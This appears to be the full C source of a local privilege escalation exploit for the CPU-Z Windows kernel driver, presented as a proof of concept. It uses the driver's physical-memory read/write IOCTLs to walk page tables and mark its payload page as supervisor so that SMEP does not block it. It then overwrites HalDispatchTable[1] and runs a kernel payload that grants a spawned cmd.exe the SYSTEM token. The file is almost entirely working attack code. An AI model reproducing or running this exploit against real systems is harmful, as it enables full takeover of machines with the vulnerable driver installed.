/**
 * @brief Local privilege escalation exploit for the CPU-Z kernel driver.
 *
 * The CPU-Z kernel driver before v1.81 allows any usermode application to
 * read control registers, read DWORDs from physical memory, and write
 * DWORDs to physical memory. We abuse this functionality to read cr3 and
 * traverse the page tables in order to build an arbitrary read/write
 * primitive over the entire virtual memory space.
 *
 * With full read/write, we flip the user/supervisor bit on the page table
 * entry (PTE) containing our payload to KernelMode to bypass Supervisor
 * Mode Execution Prevention (SMEP). We then overwrite a function pointer
 * at nt!HalDispatchTable[1] and trigger the payload by calling
 * NtQueryIntervalProfile.
 *
 * As a proof of concept, the payload will assign the SYSTEM token to a
 * suspended cmd.exe process, and resume the process. This should result in a
 * new command prompt running as NT Authority/System. The payload does not
 * rely on static offsets and should thus work on Windows XP+.
 */

#include "Cpuz.h"

#include "Internal.h"

#include <Windows.h>
#include <stdio.h>

//#define DEVICE_NAME L"Cpuz139"  // CPU-Z 1.76
//#define DEVICE_NAME L"Cpuz144"  // CPU-Z 1.81
#define DEVICE_NAME L"Cpuz148"  // CPU-Z 1.87
#define DEVICE_PATH L"\\\\.\\" DEVICE_NAME

#define DECLARE_SYMBOL(name)  name##_t g_##name = NULL

// Global to save the overwritten function pointer
PVOID g_HalDispatchTableEntry = NULL;

PROCESS_INFORMATION g_NewProcess = { 0 };

// Pointers for the exploit and payload
typedef PVOID * HalDispatchTable_t;
DECLARE_SYMBOL(HalDispatchTable);
DECLARE_SYMBOL(ZwOpenProcess);
DECLARE_SYMBOL(ZwOpenProcessTokenEx);
DECLARE_SYMBOL(ZwDuplicateToken);
DECLARE_SYMBOL(ZwSetInformationProcess);

#ifdef _X86_
BOOL g_IsPaeEnabled = FALSE;

/**
 * @brief Check to see if PAE is enabled. Set g_IsPaeEnabled accordingly.
 * @return TRUE if PAE status was successfully obtained, FALSE otherwise.
 */
static DWORD CheckPaeStatus(void)
{
    DWORD retval = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD value = 0;
    DWORD cbValue = 0;

    retval = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", &hKey);
    if (retval != ERROR_SUCCESS) {
        return retval;
    }

    cbValue = sizeof(value);
    retval = RegQueryValueExA(hKey, "PhysicalAddressExtension", NULL, NULL, (LPBYTE)&value, &cbValue);
    if (retval != ERROR_SUCCESS) {
        return retval;
    }

    g_IsPaeEnabled = (value != 0);
    return ERROR_SUCCESS;
}
#endif


/**
 * @brief Enable a privilege in the current process token.
 * @param szPrivilege The privilege to enable. One of the SE_*_NAME constants.
 * @return TRUE on success or FALSE otherwise. On error, use GetLastError()
 *      for additional information.
 */
static BOOL EnablePrivilege(
    __in LPCSTR szPrivilege)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid = { 0 };

    if (!LookupPrivilegeValueA(NULL, szPrivilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return FALSE;
    }

    return TRUE;
}


/**
 * @brief Read an x86 control register. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Register Control register to read.
 * @param Value Value of the control register.
 * @return TRUE if the control register was successfully read.
 */
static BOOL ReadControlRegister(
    __in HANDLE hDevice,
    __in ULONG Register,
    __out PULONGLONG Value)
{
    BOOL bSuccess = TRUE;
    DWORD nBytesReturned = 0;
    READ_CONTROL_REGISTER params = { 0 };

    params.in.Register = Register;

    bSuccess = DeviceIoControl(
        hDevice,
        IOCTL_READ_CONTROL_REGISTER,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
    if (bSuccess) {
        *Value = params.out.Value;
    }

    return bSuccess;
}


/**
 * @brief Read from physical memory. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param PhysicalAddress Physical address to read from.
 * @param Buffer Output buffer to write memory contents to.
 * @param Size Size of data to read. Must be a multiple of four. This is a
 *      restriction imposed by the CPU-Z driver.
 * @return TRUE if memory was successfully read, FALSE otherwise.
 */
static BOOL ReadPhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    DWORD nBytesReturned = 0;
    READ_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Size = Size;
#ifdef _X86_
    params.in.BufferAddressHigh = 0;
#else
    params.in.BufferAddressHigh = (ULONG_PTR)Buffer >> 32;
#endif
    params.in.BufferAddressLow = (ULONG_PTR)Buffer & 0xffffffff;

    return DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


/**
 * @brief Write to physical memory. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param PhysicalAddress Physical address to write to.
 * @param Value Value to write to physical memory.
 * @return TRUE if memory was successfully written, FALSE otherwise.
 */
static BOOL WritePhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __in ULONG Value)
{
    DWORD nBytesReturned = 0;
    WRITE_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Value = Value;
        
    return DeviceIoControl(
        hDevice,
        IOCTL_WRITE_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


#ifdef _X86_
/**
 * @brief PAE variant of GetPte for x86. This function should only be used for
 *      PAE x86 systems. See GetPte for additional details.
 *
 * With PAE enabled, there is an additional layer of page tables, PTEs are 8
 * bytes in size, and page table offsets are 9 bits instead of 10.
 */
static BOOL GetPtePae(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __out PHARDWARE_PTE_PAE PteOut,
    __out_opt PULONGLONG PteAddress)
{
    BOOL bSuccess = TRUE;
    ULONGLONG PdeBase = 0;
    ULONGLONG PteBase = 0;
    ULONGLONG PointerPte = 0;
    HARDWARE_PTE_PAE Pte = { 0 };

    if (!g_IsPaeEnabled) {
        return FALSE;
    }
    
    // Get the PDE base physical address
    PointerPte = Cr3 + PPE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PdeBase = Pte.PageFrameNumber << 12;

    // Get the PTE base physical address
    PointerPte = PdeBase + PDE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

    if (Pte.LargePage) {
        goto DONE;  // We just read the PTE for this page
    }
    PteBase = Pte.PageFrameNumber << 12;

    // Get the PTE
    PointerPte = PteBase + PTE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

DONE:
    if (PteAddress) {
        *PteAddress = PointerPte;
    }
    *PteOut = Pte;
    return TRUE;
}
#endif


/**
 * @brief Get the value and address of a Page Table Entry (PTE). This function
 *      should only be used for non-PAE x86 and x86_64 systems.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress The virtual address whose PTE should be retrieved.
 * @param PteOut Value of the PTE for the given virtual address.
 * @param PteAddress Physical address of the found PTE.
 * @return TRUE if the PTE was successfully obtained. FALSE if the PTE could
 *      not be found. This function will fail if the target page is paged out.
 */
static BOOL GetPte(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __out PHARDWARE_PTE PteOut,
    __out_opt PULONGLONG PteAddress)
{
    BOOL bSuccess = TRUE;
    ULONGLONG PdeBase = 0;
    ULONGLONG PteBase = 0;
    ULONGLONG PointerPte = 0;
    HARDWARE_PTE Pte = { 0 };

#ifdef _AMD64_
    ULONGLONG PxeBase = Cr3;
    ULONGLONG PpeBase = 0;

    // Get the PPE base physical address
    PointerPte = PxeBase + PXE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PpeBase = Pte.PageFrameNumber << 12;

    // Get the PDE base physical address
    PointerPte = PpeBase + PPE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PdeBase = Pte.PageFrameNumber << 12;
#else
    if (g_IsPaeEnabled) {
        return FALSE;
    }
    PdeBase = Cr3;
#endif

    // Get the PTE base physical address
    PointerPte = PdeBase + PDE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    if (Pte.LargePage) {
        goto DONE;  // We just read the PTE for this page
    }
    PteBase = Pte.PageFrameNumber << 12;

    // Get the PTE
    PointerPte = PteBase + PTE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

DONE:
    if (PteAddress) {
        *PteAddress = PointerPte;
    }
    *PteOut = Pte;
    return TRUE;
}


#ifdef _X86_
/**
 * @brief PAE variant of DisableSmep for x86. This function should only be
 *      used for PAE x86 systems. See DisableSmep for additional details.
 */
static BOOL DisableSmepPae(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __in ULONG VirtualSize)
{
    BOOL bSuccess = FALSE;
    DWORD nPages = (VirtualSize + (PAGE_SIZE - 1)) / PAGE_SIZE;
    ULONGLONG PteAddress = 0;
    HARDWARE_PTE_PAE Pte;

    for (DWORD i = 0; i < nPages; i++) {
        bSuccess = GetPtePae(hDevice, Cr3, VirtualAddress + i * PAGE_SIZE, &Pte, &PteAddress);
        if (!bSuccess) {
            return FALSE;
        }

        // Set the U/S bit to KernelMode
        Pte.Owner = 0;

        // Write the low-order DWORD (we only mondify the owner bit of the PTE).
        bSuccess = WritePhysicalMemory(hDevice, PteAddress, *(PULONG)&Pte);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}
#endif


/**
 * @brief Disable Supervisor Mode Execution Prevention for a range of pages
 *      by setting the user/supervisor bit to KernelMode for each page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to disable SMEP for.
 * @param VirtualSize Size of the range to disable SMEP for. SMEP will be
 *      be disabled for all pages containing bytes in the range
 *      [addr,addr+size).
 * @return TRUE if SMEP was successfully disabled for the given range. If
 *      FALSE is returned and VirtualAddress + VirtualSize spans multiple
 *      pages, some pages may be modified.
 */
static BOOL DisableSmep(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __in ULONG VirtualSize)
{
    BOOL bSuccess = FALSE;
    DWORD nPages = (VirtualSize + (PAGE_SIZE - 1)) / PAGE_SIZE;
    ULONGLONG PteAddress = 0;
    HARDWARE_PTE Pte;

#ifdef _X86_
    if (g_IsPaeEnabled) {
        return DisableSmepPae(hDevice, Cr3, VirtualAddress, VirtualSize);
    }
#endif

    for (DWORD i = 0; i < nPages; i++) {
        bSuccess = GetPte(hDevice, Cr3, VirtualAddress + i * PAGE_SIZE, &Pte, &PteAddress);
        if (!bSuccess) {
            return FALSE;
        }

        // Set the U/S bit to KernelMode
        Pte.Owner = 0;

        // Write the low-order DWORD (we only mondify the owner bit of the PTE).
        bSuccess = WritePhysicalMemory(hDevice, PteAddress, *(PULONG)&Pte);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}


/**
 * @brief Get the physical address for a virtual address by traversing the
 *      page tables in physical memory.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Virtual address to convert into a physical address.
 * @return The physical address for the given virtual address or 0 on error.
 */
static ULONGLONG GetPhysicalAddress(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress)
{
    BOOL bSuccess = TRUE;
    
#ifdef _X86_
    HARDWARE_PTE Pte = { 0 };
    HARDWARE_PTE_PAE PtePae = { 0 };

    if (g_IsPaeEnabled) {
        bSuccess = GetPtePae(hDevice, Cr3, VirtualAddress, &PtePae, NULL);
        if (!bSuccess) {
            return 0;
        }

        if (PtePae.LargePage) {
            return (PtePae.PageFrameNumber << 12) + (VirtualAddress & 0x1fffff);
        }
        return (PtePae.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
    }
    else {
        bSuccess = GetPte(hDevice, Cr3, VirtualAddress, &Pte, NULL);
        if (!bSuccess) {
            return 0;
        }

        if (Pte.LargePage) {
            return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0x3fffff);
        }
        return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
    }
#else   // _AMD64_
    HARDWARE_PTE Pte = { 0 };

    bSuccess = GetPte(hDevice, Cr3, VirtualAddress, &Pte, NULL);
    if (!bSuccess) {
        return 0;
    }

    if (Pte.LargePage) {
        return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0x1fffff);
    }

    return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
#endif
}


/**
 * @brief Read virtual memory from a single page. Note that this function
 *      does not properly handle page boundaries. If data spans multiple
 *      pages, call this function once per page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to read from. This address
 *      can be a kernel mode address.
 * @param Buffer Buffer to read memory into.
 * @param Size Amount of data to read.
 * @return TRUE if all data was successfully read, FALSE otherwise.
 */
static BOOL ReadVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)VirtualAddress);
    if (PhysicalAddress == NULL) {
        SetLastError(STATUS_ACCESS_VIOLATION);
        return FALSE;
    }

    return ReadPhysicalMemory(hDevice, PhysicalAddress, Buffer, Size);
}


/**
 * @brief Write virtual memory to a single page. Note that this function
 *      does not properly handle page boundaries. If data spans multiple
 *      pages, call this function once per page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to write to. This address
 *      can be a kernel mode address.
 * @param Buffer Data to write.
 * @param Size Amount of data to write.
 * @return TRUE if all data was successfully written, FALSE otherwise.
 */
static BOOL WriteVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __in PVOID Buffer,
    __in SIZE_T Size)
{
    BOOL bSuccess = TRUE;

    if (Size % sizeof(ULONG) != 0) {
        SetLastError(ERROR_OFFSET_ALIGNMENT_VIOLATION);
        return FALSE;
    }

    for (SIZE_T i = 0; i < Size / sizeof(ULONG); i++) {
        PULONG addr = (PULONG)VirtualAddress + i;
        ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)addr);
        if (PhysicalAddress == NULL) {
            SetLastError(STATUS_ACCESS_VIOLATION);
            return FALSE;
        }

        bSuccess = WritePhysicalMemory(hDevice, PhysicalAddress, ((PULONG)Buffer)[i]);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}


/**
 * @brief Get the base address and filepath for ntoskrnl.exe. This function
 *      will not work in a low-integrity process due to the use of
 *      ntdll!NtQuerySystemInformation(SystemModuleInformation,...).
 * @param BaseAddress The found base address of the kernel.
 * @param Filepath An absolute path to the kernel on disk.
 * @return TRUE if all info was found, FALSE otherwise.
 */
static BOOL GetNtosInformation(
    __out PULONG_PTR BaseAddress,
    __out LPSTR Filepath)
{
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        return FALSE;
    }

    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(Ntdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return FALSE;
    }

    ULONG cbModuleInfo = 0;
    NTSTATUS retval = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &cbModuleInfo);
    if (retval != STATUS_INFO_LENGTH_MISMATCH) {
        return FALSE;
    }

    PSYSTEM_MODULES pModules = (PSYSTEM_MODULES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbModuleInfo);
    if (pModules == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    retval = NtQuerySystemInformation(SystemModuleInformation, pModules, cbModuleInfo, NULL);
    if (retval != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pModules); 
        SetLastError(retval);
        return FALSE;
    }
    
    for (DWORD i = 0; i < pModules->Count; i++) {
        PSYSTEM_MODULE_INFORMATION pModuleInfo = &pModules->Modules[i];
        LPSTR szName = pModuleInfo->ImageName + pModuleInfo->ModuleNameOffset;
        if (strcmp(szName, "ntoskrnl.exe") == 0 ||
            strcmp(szName, "ntkrnlpa.exe") == 0 ||
            strcmp(szName, "ntkrnlmp.exe") == 0 ||
            strcmp(szName, "ntkrpamp.exe") == 0)
        {
            *BaseAddress = (ULONG_PTR)pModuleInfo->Base;
            strcpy_s(Filepath, MAX_PATH, "C:\\Windows\\System32\\");
            strcat_s(Filepath, MAX_PATH, szName);
            HeapFree(GetProcessHeap(), 0, pModules);
            return TRUE;
        }
    }

    HeapFree(GetProcessHeap(), 0, pModules);
    SetLastError(ERROR_NOT_FOUND);
    return FALSE;
}


/**
 * @brief Resolve kernel symbols required for the payload.
 * @return TRUE if all symbols were successfully resolved, FALSE otherwise.
 */
static BOOL ResolveKernelSymbols(VOID)
{
    // Get kernel base address and file path
    ULONG_PTR NtosBaseAddress = 0;
    CHAR szNtosPath[MAX_PATH] = { 0 };
    BOOL bSuccess = GetNtosInformation(&NtosBaseAddress, szNtosPath);
    if (!bSuccess) {
        return FALSE;
    }

    // Map the kernel into userspace
    HMODULE Ntos = LoadLibraryExA(szNtosPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (Ntos == NULL) {
        return FALSE;
    }

    // Resolve any function pointers needed for the exploit and payload
#define RESOLVE_SYMBOL(name) do { \
    ULONG_PTR addr = (ULONG_PTR)GetProcAddress(Ntos, #name); \
    if (addr == NULL) { \
        printf("[-] Error resolving kernel symbol: %s\n", #name); \
        FreeLibrary(Ntos); \
        return FALSE; \
    } \
    g_##name = (name##_t)(NtosBaseAddress + (addr - (ULONG_PTR)Ntos)); \
} while (0);

    RESOLVE_SYMBOL(HalDispatchTable);
    RESOLVE_SYMBOL(ZwOpenProcess);
    RESOLVE_SYMBOL(ZwOpenProcessTokenEx);
    RESOLVE_SYMBOL(ZwDuplicateToken);
    RESOLVE_SYMBOL(ZwSetInformationProcess);

    FreeLibrary(Ntos);
    return TRUE;
}


/**
 * @brief Payload that will be executed with kernel-mode privileges.
 *
 * As a proof of concept, this function will assign the system process's token
 * to a given process. However, it can be easily modified to take any other
 * kernel mode action.
 *
 * Since SMEP will be disabled for the entire page this code exists on, this
 * code must be copied to a fresh page to prevent an access violation. In order
 * to obtain the size of this function, it is explicitly placed before the
 * PayloadEnd function in the object file by specifying /ORDER to the linker.
 * We can then dynamically compute PayloadEnd - Payload to get the size. These
 * two functions must be non-static for /ORDER to work.
 */
ULONG WINAPI Payload(
    ULONG a,
    ULONG b,
    ULONG c,
    ULONG d)
{
    // Restore the HalDispatchTable
    g_HalDispatchTable[1] = g_HalDispatchTableEntry;

    // Open the system process
    HANDLE hSystemProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID ClientId = { (HANDLE)4, 0 };
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    NTSTATUS retval = g_ZwOpenProcess(&hSystemProcess, PROCESS_ALL_ACCESS, &oa, &ClientId);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Open the system token
    HANDLE hSystemToken = NULL;
    retval = g_ZwOpenProcessTokenEx(hSystemProcess, TOKEN_ALL_ACCESS | TOKEN_ASSIGN_PRIMARY, OBJ_KERNEL_HANDLE, &hSystemToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Duplicate the system token
    HANDLE hDuplicatedToken = NULL;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    retval = g_ZwDuplicateToken(hSystemToken, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &hDuplicatedToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
     
    // Update the specified process's token
    PROCESS_ACCESS_TOKEN TokenInformation = { hDuplicatedToken, 0 };
    retval = g_ZwSetInformationProcess(g_NewProcess.hProcess, ProcessAccessToken, &TokenInformation, sizeof(TokenInformation));
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
    
    return 0;
}
ULONG WINAPI PayloadEnd(void)
{
    return 0;
}


int main(int argc, char *argv[])
{
    DWORD retval = ERROR_SUCCESS;
    BOOL bSuccess = FALSE;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    ULONGLONG Cr3 = 0;
    PVOID pPayload = NULL;
    ULONG_PTR cbPayload = (ULONG_PTR)PayloadEnd - (ULONG_PTR)Payload;

#ifdef _X86_
    // Check to see if PAE is enabled
    retval = CheckPaeStatus();
    if (retval != ERROR_SUCCESS) {
        printf("[-] Could not get PAE status: %lu\n", retval);
        return 1;
    }
    printf(g_IsPaeEnabled ? "[*] PAE is enabled\n" : "[*] PAE is not enabled\n");
#endif

    // Try to enable SeLoadDriverPrivilege. The CPU-Z patch in v1.81 checks
    // to see if the process opening the driver's device has this privilege.
    if (EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        printf("[+] Enabled SeLoadDriverPrivilege\n");
    }
    else {
        printf("[*] WARNING: Could not enable SeLoadDriverPrivilege: %lu\n", GetLastError());
        // continue anyways - worst case is the CreateFileW fails on a patched copy of CPU-Z
    }

    // Open the vulnerable device
    hDevice = CreateFileW(
        DEVICE_PATH,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open device: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Opened device %ws Handle=0x%zx\n", DEVICE_PATH, (size_t)hDevice);

    // Get CR3 value so we can read/write all virtual memory
    bSuccess = ReadControlRegister(hDevice, 3, &Cr3);
    if (!bSuccess) {
        printf("[-] Could not get page table base: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Read CR3: 0x%llx\n", Cr3);

    // Resolve kernel addresses needed for the exploit/payload
    bSuccess = ResolveKernelSymbols();
    if (!bSuccess) {
        printf("[-] Could not resolve kernel symbols: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Resolved kernel functions\n");

    // Copy the payload to a new page since disabling SMEP will make the whole page KernelMode
    pPayload = VirtualAlloc(NULL, cbPayload, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pPayload == NULL) {
        printf("[-] Could not allocate memory for payload: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    memcpy(pPayload, Payload, cbPayload);
    printf("[*] Copied payload to 0x%p\n", pPayload);

    // Overwrite the second entry in HalDispatchTable with a pointer to our payload
    // Save the original value of the entry
    bSuccess = ReadVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &g_HalDispatchTableEntry, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not save HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Saved HalDispatchTable[1]: 0x%p\n", g_HalDispatchTableEntry);

    // Write our function pointer
    bSuccess = WriteVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &pPayload, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not overwrite HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Overwrote HalDispatchTable[1] with userspace function pointer: 0x%p\n", pPayload);

    // Disable SMEP by marking our payload as a supervisor page
    bSuccess = DisableSmep(hDevice, Cr3, (ULONG_PTR)pPayload, (ULONG)cbPayload);
    if (!bSuccess) {
        printf("[-] Could not update payload U/S PTE entry");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Disabled SMEP for payload\n");

    // Create a new suspended process
    printf("[*] Spawning suspended process...\n");
    STARTUPINFO si = { 0 };
    bSuccess = CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &g_NewProcess);
    if (!bSuccess) {
        printf("[-] Could not spawn process  error=%lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    // Find NtQueryIntervalProfile in order to trigger the exploit
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(Ntdll, "NtQueryIntervalProfile");
    if (NtQueryIntervalProfile == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    // Trigger the exploit
    printf("[*] Triggering exploit...\n");
    ULONG Junk = 0;
    NtQueryIntervalProfile(2, &Junk);    

    printf("[*] Resuming suspended process...\n");
    ResumeThread(g_NewProcess.hThread);

    printf("[+] Done\n");
    CloseHandle(hDevice);
    return 0;
}
